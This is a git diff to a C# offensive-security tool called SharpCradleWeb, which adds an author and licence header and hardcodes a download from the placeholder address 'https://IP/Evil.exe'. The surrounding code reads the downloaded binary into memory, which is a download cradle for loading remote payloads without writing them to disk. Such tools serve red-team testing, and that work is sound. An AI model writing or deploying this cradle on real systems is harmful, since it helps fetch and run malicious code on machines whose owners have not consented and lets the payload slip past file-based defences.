@@ -4,6 +4,11 @@ using System.Linq;
 using System.Net;
 using System.Reflection;
 
+/*
+Author: @anthemtotheego
+License: BSD 3-Clause    
+*/
+
 namespace SharpCradleWeb
 {
     class Program
@@ -16,7 +21,7 @@ namespace SharpCradleWeb
                 {
                     //Access web and read the bytes from the binary file
                     System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
-                    ms = new MemoryStream(client.DownloadData(args[1]));
+                    ms = new MemoryStream(client.DownloadData("https://IP/Evil.exe"));
                     BinaryReader br = new BinaryReader(ms);
                     byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                     ms.Close();
